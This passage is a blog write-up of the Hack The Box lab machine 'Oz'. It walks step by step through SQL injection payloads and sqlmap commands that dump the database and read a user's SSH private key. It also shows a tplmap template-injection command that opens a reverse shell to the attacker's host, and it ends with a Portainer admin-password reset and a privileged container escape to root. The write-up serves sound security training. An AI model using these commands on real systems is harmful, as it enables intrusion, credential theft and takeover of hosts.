&lt;h4 id=&quot;so-we-have-users-which-is-a-valid-path--what-happens-if-we-tried-a-username-that-probably-exists-something-like-admin-&quot;&gt;So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ?&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-a-json-response-username--admin&quot;&gt;We get a json response &lt;code class=&quot;highlighter-rouge&quot;&gt;username : &quot;admin&quot;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-try-a-single-quote-&quot;&gt;Let’s try a single quote &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-500-internal-server-error-so-this-endpoint-is-probably-vulnerable-to-sql-injection--lets-try-something-else--or-1-or&quot;&gt;We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let’s try something else , &lt;code class=&quot;highlighter-rouge&quot;&gt;'OR 1 OR'&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-another-username--dorthi--so-this-is-a-confirmation-that-its-vulnerable-to-sqli--lets-do-another-injection-and-see-if-we-can-enumerate-users&quot;&gt;We get another username : “dorthi” , So this is a confirmation that it’s vulnerable to sqli , Let’s do another injection and see if we can enumerate users&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;' or length(username)='4&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/oz/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;another-username--toto&quot;&gt;Another username : “toto”&lt;/h4&gt;
&lt;h4 id=&quot;lets-try-7&quot;&gt;Let’s try 7&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;tinman&quot;&gt;tin.man&lt;/h4&gt;
&lt;h4 id=&quot;so-we-confirmed-its-sqli--the-next-step-is-to-use-sqlmap&quot;&gt;So we confirmed it’s sqli , The next step is to use sqlmap.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap -u http://10.10.10.96/users/toto --all&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-will-dump-the-whole-database&quot;&gt;This will dump the whole database&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-some-time-it-will-start-dumping-tables-and-we-will-notice-an-interesting-table-users_gbw&quot;&gt;After some time it will start dumping tables and we will notice an interesting table &lt;code class=&quot;highlighter-rouge&quot;&gt;users_gbw&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-if-we-try-to-crack-those-hashes-the-only-one-that-will-crack-is-wizardoz--wizardofoz22&quot;&gt;So if we try to crack those hashes the only one that will crack is wizard.oz : &lt;code class=&quot;highlighter-rouge&quot;&gt;wizardofoz22&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-have-a-username-and-its-password-lets-login-to-port-8080&quot;&gt;Now we have a username and its password let’s login to port 8080&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-success-&quot;&gt;And success !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;dorthis-ssh-key&quot;&gt;Dorthi’s ssh key&lt;/h3&gt;
&lt;h4 id=&quot;we-login-to-something-that-looks-like-a-ticketing-system-after-reading-the-tickets-we-will-find-2-interesting-tickets&quot;&gt;We login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-this-ssh-key-is-on-the-database-and-we-have-sqli-on-that-database--lets-grab-it&quot;&gt;So this ssh key is on the database and we have sqli on that database , Let’s grab it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.10.96/users/toto&quot; --string &quot;username&quot; --file-read &quot;/home/dorthi/.ssh/id_rsa&quot; -v1&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/oz/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;cool-so-now-we-can-ssh-and-own-user-no-wait-&quot;&gt;Cool so now we can ssh and own user, No wait …&lt;/h4&gt;
&lt;h4 id=&quot;by-looking-at-the-nmap-scan-again&quot;&gt;By looking at the nmap scan again:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-no-ssh-listening-&quot;&gt;There’s no ssh listening !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;server-side-template-injection&quot;&gt;Server Side Template Injection&lt;/h3&gt;
&lt;h4 id=&quot;if-we-return-to-that-ticketing-system-we-will-see-that-we-can-add-a-ticket--it-asks-us-for-a-name-and-a-description&quot;&gt;If we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-capturing-that-request-in-burp-we-will-see-a-post-request-with-two-parameters-name-and-desc&quot;&gt;By capturing that request in burp we will see a POST request with two parameters name and desc.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-the-response-outputs-them&quot;&gt;And the response outputs them.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-used-tplmap-a-tool-like-sqlmap-for-automatic-template-injection-exploitation-we-will-find-that-its-vulnerable&quot;&gt;If we used &lt;a href=&quot;https://github.com/epinna/tplmap&quot;&gt;tplmap&lt;/a&gt; (a tool like sqlmap for automatic template injection exploitation) we will find that it’s vulnerable.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&amp;amp;desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/oz/26.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-check-our-listener--we-will-get-a-reverse-shell&quot;&gt;Then we check our listener , we will get a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;knock--knock&quot;&gt;Knock , Knock&lt;/h3&gt;
&lt;h4 id=&quot;after-some-enumeration-we-will-find-in--two-unusual-dirs-containers-and-secret--in-secret-there-is-a-file-called-knockdconf&quot;&gt;After some enumeration we will find in &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; two unusual dirs &lt;code class=&quot;highlighter-rouge&quot;&gt;containers&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.secret&lt;/code&gt; , in &lt;code class=&quot;highlighter-rouge&quot;&gt;.secret&lt;/code&gt; there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;knockd.conf&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-a-configuration-file-for-ssh-port-knocking-port-knocking-means-that-in-order-to-connect-to-an-ssh-server-you-need-to-ping-some-ports-in-a-specific-sequence-to-be-able-to-connect&quot;&gt;That’s a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-our-situation-the-ports-are-40809-50212-46969-and-all-of-them-are-udp&quot;&gt;In our situation the ports are 40809 50212 46969 and all of them are udp&lt;/h4&gt;
&lt;h4 id=&quot;in-the-other-dir-containers-theres-a-dir-called-database-which-has-some-files-one-of-them-is-called-startsh&quot;&gt;In the other dir &lt;code class=&quot;highlighter-rouge&quot;&gt;containers&lt;/code&gt; there’s a dir called &lt;code class=&quot;highlighter-rouge&quot;&gt;database&lt;/code&gt; which has some files, One of them is called &lt;code class=&quot;highlighter-rouge&quot;&gt;start.sh&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-grabbed-some-passwords-maybe-we-will-need-them-later&quot;&gt;And we grabbed some passwords maybe we will need them later.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-know-the-port-sequence-lets-ssh-into-the-box-we-can-use-knockd-to-do-that-but-i-used-a-small-script-that-uses-nmap&quot;&gt;Now we know the port sequence let’s ssh into the box. We can use knockd to do that but I used a small script that uses nmap.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-chmod-600-to-the-key-then-execute-our-script&quot;&gt;We &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600&lt;/code&gt; to the key then execute our script.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-key-is-protected-with-a-password--lets-try-the-db-password-we-found-earlier--n0pl4c3l1keh0me&quot;&gt;The key is protected with a password , Let’s try the db password we found earlier : “N0Pl4c3L1keH0me”&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;portainer&quot;&gt;Portainer&lt;/h3&gt;
&lt;h4 id=&quot;after-some-regular-enumeration-if-we-do-sudo--l-we-will-find-that-dorthi-can-run-some-commands-as-root-docker-network-ls-and-docker-network-inspect-&quot;&gt;After some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root &lt;code class=&quot;highlighter-rouge&quot;&gt;docker network ls&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker network inspect *&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-first-list-the-networks&quot;&gt;Let’s first list the networks&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo docker network ls&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/oz/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-some-networks-lets-inspect-the-first-one-bridge&quot;&gt;We see some networks let’s inspect the first one &lt;code class=&quot;highlighter-rouge&quot;&gt;bridge&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo docker network inspect bridge&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/oz/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-find-portainer-1111-and-its-ip-is-1721702--portainer-is-the-user-interface-for-docker-management-and-it-usually-runs-http-on-port-9000--we-can-also-check-that-by-using-nmap-luckily-its-installed-on-the-box&quot;&gt;We find &lt;code class=&quot;highlighter-rouge&quot;&gt;portainer-1.11.1&lt;/code&gt; and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;172.17.0.2&lt;/code&gt; , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it’s installed on the box.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-that-port-9000-is-listening--so-now-we-need-to-set-up-an-ssh-port-forwarding-to-be-able-to-access-that-portainer&quot;&gt;And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-edit-the-ssh-port-knocking-script-to-add-the-forwarding-command&quot;&gt;We can edit the ssh port knocking script to add the forwarding command.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-when-we-visit-localhost-on-port-9000-we-get-a-login-page&quot;&gt;Now when we visit localhost on port 9000 we get a login page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-using-the-http-api-as-documented-here-we-can-re-assign-the-admin-password-by-sending-a-post-request-to-apiusersadmininit-with-data-as--usernameadminpasswordnew-password&quot;&gt;By using the HTTP API as documented &lt;a href=&quot;https://gist.github.com/deviantony/77026d402366b4b43fa5918d41bc42f8&quot;&gt;here&lt;/a&gt; we can re-assign the admin password by sending a POST request to &lt;code class=&quot;highlighter-rouge&quot;&gt;/api/users/admin/init&lt;/code&gt; with data as : &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;new-password&quot;}&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-did-it-with-burp-and-set-the-password-to-l0c4l-&quot;&gt;I did it with burp and set the password to &lt;code class=&quot;highlighter-rouge&quot;&gt;l0c4l&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/40.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/oz/41.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;
&lt;h4 id=&quot;after-we-login-we-will-see-the-dashboard-showing-the-status-of-the-containers&quot;&gt;After we login we will see the dashboard showing the status of the containers.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-the-containers-tab-there-are-4-container-running&quot;&gt;In the containers tab there are 4 container running.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-check-the-container-webapi-we-can-use-its-console&quot;&gt;If we check the container webapi we can use its console.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-create-a-new-container-with-the-image-of-webapi-and-mount-root-or-the-whole-filesystem--then-use-the-console-to-access-it&quot;&gt;We can create a new container with the image of webapi and mount &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; or the whole filesystem &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; then use the console to access it.&lt;/h4&gt;
&lt;h4 id=&quot;first-we-will-grab-the-image-name-from-the-images-tab--webapilatest&quot;&gt;First we will grab the image name from the images tab : “webapi:latest”&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-create-a-container-and-name-it-anything--i-named-it-nicecontainer--add-the-image--then-add-a-volume-with-path-root-and-mount-it-to-mnt&quot;&gt;Then we will create a container and name it anything , I named it “NiceContainer” , add the image , then add a volume with path &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; and mount it to /mnt/&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-from-the-security-tab-we-choose-privileged-mode&quot;&gt;Then from the security tab we choose privileged mode.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;click-create--use-the-console--cd-mnt-and-we-own-root--d&quot;&gt;Click create , Use the console , &lt;code class=&quot;highlighter-rouge&quot;&gt;cd /mnt&lt;/code&gt; and we own root ! :D&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/oz/48.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---waldo&quot;&gt;previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/waldo/&quot;&gt;Hack The Box - Waldo&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---secnotes&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/secnotes/&quot;&gt;Hack The Box - SecNotes&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in. Check out my other Hack The Box write-ups Nmap As always we will start by running nmap to scan for open ports and services. nmap -sV -sT -o nmapinitial oz.htb Note : I added the ip to my /etc/hosts file as oz.htb And we see only http on port 80 and 8080. We also see that it’s running a python server. Enumerating http On port 80 there’s a web page with the title “OZ Webapi” and it’s asking us to register a username. On port 8080 we see a login page. If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response. And that’s because the server doesn’t respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars. Here I requested http://oz.htb/anything And this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us. wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0 This won’t show us any response with 0 lines. After a few seconds we get /users/ SQL Injection When we visit /users/ in the browser we get the default response : please register a username. So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ? We get a json response username : &quot;admin&quot; Let’s try a single quote ' We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let’s try something else , 'OR 1 OR' We get another username : “dorthi” , So this is a confirmation that it’s vulnerable to sqli , Let’s do another injection and see if we can enumerate users ' or length(username)='4 Another username : “toto” Let’s try 7 tin.man So we confirmed it’s sqli , The next step is to use sqlmap. sqlmap -u http://10.10.10.96/users/toto --all This will dump the whole database After some time it will start dumping tables and we will notice an interesting table users_gbw So if we try to crack those hashes the only one that will crack is wizard.oz : wizardofoz22 Now we have a username and its password let’s login to port 8080 And success ! Dorthi’s ssh key We login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets. So this ssh key is on the database and we have sqli on that database , Let’s grab it. sqlmap -u &quot;http://10.10.10.96/users/toto&quot; --string &quot;username&quot; --file-read &quot;/home/dorthi/.ssh/id_rsa&quot; -v1 Cool so now we can ssh and own user, No wait … By looking at the nmap scan again: There’s no ssh listening ! Server Side Template Injection If we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description. By capturing that request in burp we will see a POST request with two parameters name and desc. And the response outputs them. If we used tplmap (a tool like sqlmap for automatic template injection exploitation) we will find that it’s vulnerable. python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&amp;amp;desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337 Then we check our listener , we will get a reverse shell. Knock , Knock After some enumeration we will find in / two unusual dirs containers and .secret , in .secret there is a file called knockd.conf That’s a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect. In our situation the ports are 40809 50212 46969 and all of them are udp In the other dir containers there’s a dir called database which has some files, One of them is called start.sh And we grabbed some passwords maybe we will need them later. Now we know the port sequence let’s ssh into the box. We can use knockd to do that but I used a small script that uses nmap. We chmod 600 to the key then execute our script. The key is protected with a password , Let’s try the db password we found earlier : “N0Pl4c3L1keH0me” And we owned user ! Portainer After some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root docker network ls and docker network inspect * Let’s first list the networks sudo docker network ls We see some networks let’s inspect the first one bridge sudo docker network inspect bridge We find portainer-1.11.1 and its ip is 172.17.0.2 , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it’s installed on the box. And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer. We can edit the ssh port knocking script to add the forwarding command. Now when we visit localhost on port 9000 we get a login page. By using the HTTP API as documented here we can re-assign the admin password by sending a POST request to /api/users/admin/init with data as : {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;new-password&quot;} I did it with burp and set the password to l0c4l : Root After we login we will see the dashboard showing the status of the containers. In the containers tab there are 4 container running. If we check the container webapi we can use its console. We can create a new container with the image of webapi and mount /root or the whole filesystem / then use the console to access it. First we will grab the image name from the images tab : “webapi:latest” Then we will create a container and name it anything , I named it “NiceContainer” , add the image , then add a volume with path /root and mount it to /mnt/ Then from the security tab we choose privileged mode. Click create , Use the console , cd /mnt and we own root ! :D That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Waldo Next Hack The Box write-up : Hack The Box - SecNotes</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/oz/0.png" /></entry></feed>